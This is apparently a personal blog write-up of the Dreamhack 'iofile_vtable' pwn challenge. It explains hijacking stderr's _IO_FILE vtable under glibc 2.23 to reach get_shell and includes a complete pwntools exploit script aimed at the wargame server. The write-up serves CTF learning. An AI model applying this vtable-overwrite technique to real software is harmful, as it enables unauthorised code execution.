+++
date = '2026-05-22'
draft = false
title = 'Dreamhack iofile_vtable Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
이 문제는 서버에서 작동하고 있는 서비스(iofile_vtable)의 바이너리와 소스 코드가 주어집니다.
프로그램의 취약점을 찾고 익스플로잇해 get_shell 함수를 실행시키세요.
셸을 획득한 후, "flag" 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

---

The environment is using Ubuntu 16.04 which clues at libc version 2.23. This libc version doesn't flip out when `_IO_FILE->vtable` points to some random address.

```c
initialize(argc, argv, envp);
  printf("what is your name: ");
  read(0, &name, 8u);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. print");
      puts("2. error");
      puts("3. read");
      puts("4. chance");
      printf("> ");
      __isoc99_scanf("%d", v3);
      if ( v3[0] != 2 )
        break;
      fwrite("ERROR\n", 1u, 6u, stderr);
    }
    if ( v3[0] > 2 )
    {
      if ( v3[0] == 3 )
      {
        fgetc(stdin);
      }
      else if ( v3[0] == 4 )
      {
        printf("change: ");
        read(0, &stderr[1], 8u);
      }
    }
    else if ( v3[0] == 1 )
    {
      puts("GOOD");
    }
```


## Identifying the vulnerabilities

The challenge name is pretty intuitive, we need to overwrite the vtable in the `_IO_FILE` structure. We're given a write right into `stderr[1]`, which is the `vtable`. Our write, stderr, is the head of the `_IO_list_all` struct.

We also have a `get_shell` function. But what exactly to overwrite?

When a function like `fwrite` is called, it fetches the function it needs from the `vtable` by accessing `_IO_FILE->vtable`, in our case `_IO_file_jumps`. And after I read the documentation, I found that `fwrite` will try to fetch `_IO_file_jumps+56`, `_IO_new_file_xsputn`.

At first, I tried to give the `vtable` `get_shell - 56` but that gave an error - it was trying to access what was *inside* `get_shell` (I mean as a pointer). But we also have a write into the `bss` through *name*, so we can leverage that, by making name point to `get_shell` and overwriting `vtable` with `name - 56`.

```bash
#0x7ffff7f90060 <_IO_file_jumps+48>:     0x00007ffff7e3a5e0      0x00007ffff7e379c0
#0x7ffff7e379c0 <_IO_new_file_xsputn>:   0x417974d28548c031 
```

And, that worked!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf =  ELF("./iofile_vtable")
#libc = ELF("./libc.so.6")

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:16916'

ip, port = cyberedu.split(':')
port = int(port)


if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#x/5gx 0x6010C0
#0x6010c0 <stderr@@GLIBC_2.2.5>: 0x00007ffff7f924e0

#0x7ffff7f924e0 is stderr -> _IO_list_all atm
#vtable is after the *file structure
#we write at stderr +1 -> exactly inside its vtable
#question is, what function is going to get called from vtable.

getshell = 0x40094a
name = 0x6010D0
#gdb.attach(p)

p.recvuntil(b": ")
p.send(p64(getshell))

p.recvuntil(b"> ")
p.sendline(b"4")

p.send(p64(name-56))

p.recvuntil(b"> ")
p.sendline(b"2")

#i set a bp inside the fwrite
#also that does vtable ->_IO_FILE_xsputn
#0x7ffff7f90060 <_IO_file_jumps+48>:     0x00007ffff7e3a5e0      0x00007ffff7e379c0
#0x7ffff7e379c0 <_IO_new_file_xsputn>:   0x417974d28548c031 

#face call [addr + 0x38]
#adica ce e acolo inauntru
#de aia ni se da name?
#dam name - 0x38, si in name punem p64(getshell)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/iofile_vtable.py)**.
